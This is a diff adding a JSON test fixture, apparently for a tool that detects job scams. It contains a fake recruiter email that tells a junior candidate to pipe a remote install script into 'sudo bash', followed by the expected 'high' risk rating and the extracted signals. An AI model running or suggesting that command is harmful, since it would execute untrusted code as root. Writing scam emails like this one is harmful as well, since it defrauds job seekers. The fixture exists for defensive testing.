@@ -1,0 +1,19 @@
+{
+  "note": "Tells the candidate to pipe a downloaded script into a root shell to set up an assessment.",
+  "text": "Hi Priya,\n\nYour coding assessment for Quartzline Systems is ready. To set up the environment, open your terminal and run:\n\ncurl -s http://quartzline-setup.example/install.sh | sudo bash\n\nThen reply with a screenshot of your desktop.\n\nQuartzline Talent\ntalent@quartzline-systems.example",
+  "expectedLevel": "high",
+  "profile": { "field": "tech", "level": "junior", "skills": ["Python"] },
+  "source": "email",
+  "stage": "interviewing",
+  "savedSteps": {
+    "extract": {
+      "status": "done",
+      "data": {
+        "company": { "value": "Quartzline Systems", "quote": "Quartzline Systems" },
+        "sender": { "name": null, "email": "talent@quartzline-systems.example", "phone": null },
+        "asks": [{ "kind": "run_code_or_install", "quote": "curl -s http://quartzline-setup.example/install.sh | sudo bash" }]
+      }
+    },
+    "sender": { "status": "done", "data": { "email": "talent@quartzline-systems.example", "domain": "quartzline-systems.example", "freeEmail": false, "registeredAt": "-12d", "hasMx": true } }
+  }
+}
